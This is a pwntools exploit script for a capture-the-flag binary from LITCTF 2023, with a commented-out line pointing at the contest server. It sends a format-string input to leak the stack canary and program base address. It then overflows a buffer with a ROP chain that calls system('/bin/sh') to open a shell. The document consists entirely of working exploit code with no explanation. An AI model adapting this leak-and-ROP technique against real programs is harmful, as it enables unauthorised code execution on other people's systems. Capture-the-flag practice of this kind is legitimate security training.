from pwn import *

e = context.binary = ELF("../challenges/LITCTF2023_mypetcanarysbirthdaypie")
r = e.process()
# r = remote("litctf.org", 31791)
libc = ELF("/home/user/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6")
r.sendline(b'%11$p|%13$p|%12$p|')
canary = int(r.recvuntil(b'|').strip(b'|'), 16)
e.address = int(r.recvuntil(b'|').strip(b'|'), 16) - e.sym['main'] - 58
log.info(f'PIE: {hex(e.address)}')
log.info(f'Canary: {hex(canary)}')
bin_sh = e.address + 0x2004
pop_rdi = e.address + 0x01323

payload = b'A' * 40
payload += p64(canary) + p64(0)
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(pop_rdi + 1)
payload += p64(e.plt['system'])

r.sendline(payload)

r.interactive()